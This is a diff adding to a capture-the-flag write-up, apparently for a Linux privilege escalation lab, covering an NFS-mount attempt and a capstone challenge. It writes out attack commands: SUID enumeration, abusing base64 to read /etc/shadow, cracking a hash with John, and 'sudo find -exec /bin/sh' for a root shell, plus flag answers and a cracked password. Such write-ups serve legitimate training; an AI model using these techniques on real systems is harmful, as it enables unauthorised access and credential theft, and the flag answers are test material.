@@ -396,16 +396,103 @@ Gain a root shell on the target system
 
 4. What is the content of the flag7.txt file?
 
+   For this we will mount the `/tmp` folder to our system and add a binary that will give us root access.
 
+   ```cmd
+   mkdir /tmp/sharedtmpfolder
+   mount -o rw 10.10.253.205:/tmp /tmp/sharedtmpfolder
+
+   vi nfs.c
+   chmod +x
+   gcc nfs.c -o nfs -w
+   ```
+
+   NFS SCRIPT
+
+   Unfortunately, I would get errors messages when trying to compile to file. In the end this just didn't seem to work on my system.
 
    ><details><summary>Click for answer</summary></details>
 
 ### Capstone Challenge
 
+1. What is the content of the flag1.txt file?
 
+   First thing to do is to locate the flags. Unfortunately, the search didn't reveal anything. Probably, because our account is not allowed to look into other users folders.
 
-1. 
+   ```cmd
+   find / -name flag* 2>/dev/null
+   ```
 
+   After enumerating multiple entry vectors, the SUID method seems to work. Using the following command we see we can abuse `base64` to read files we aren't allowed to.
+
+   ```cmd
+   find / -type f -perm -4000 2>/dev/null
+   ```
+
+   CAPSTONE SUID
+
+   Using GTFOBins, we can see how we can read such files.
+
+   CAPSTONE SUID GTFO
+
+   Unfortunately, we don't know the location of the flags yet, but we can try and read the shadow file.
    
+   ```cmd
+   /usr/bin/base64 "/etc/shadow" | base64 --decode
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   CAPSTON SHADOW
+
+   Cracking missy's hash with John gives us her password (unfortunately we couldn't crack roots password).
+
+   ```cmd
+   john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt  missyhash.hash
+
+   Results -> Password1
+   ```
+
+   After switching the missy's account using `su missy` we can look for any of the flags again. Looks like there is one located at `/home/missy/Documents/flag1.txt`.
+
+   This flag we can actually read now.
+
+   CAPSTONE FLAG1
+
+   ><details><summary>Click for answer</summary>THM-42828719920544</details>
+
+3. What is the content of the flag2.txt file?
+
+   The second flag is probably located in `/home/rootflag`, so we will probably need root access for this one.
+
+   After searching for a long time, I couldn't find anything. But then I re-checked missy to see if she could run anything with sudo.
+
+   ```cmd
+   sudo -l
+   ```
+
+   Apparently, she can use `find` with sudo. We can use the following command to find the second flag:
+
+   ```cmd
+   sudo find /home -name flag* 2>/dev/null
+   ```
+
+   CAPTSONE FLAG LOCATION
+
+   We can now either use the same `base64` exploit to read the flag or we can escalate our privileges to root with the find binary.
+
+   ```cmd
+   /usr/bin/base64 "/home/rootflag/flag2.txt" | base64 --decode
+   ```
+
+   CAPSTONE FLAG2 BASE
+
+   Or
+
+   ```cmd
+   sudo find . -exec /bin/sh \; -quit
+
+   cat /home/rootflag/flag2.txt
+   ```
+
+   CAPSTONE FLAG2 ROOT   
+
+   ><details><summary>Click for answer</summary>THM-168824782390238</details>
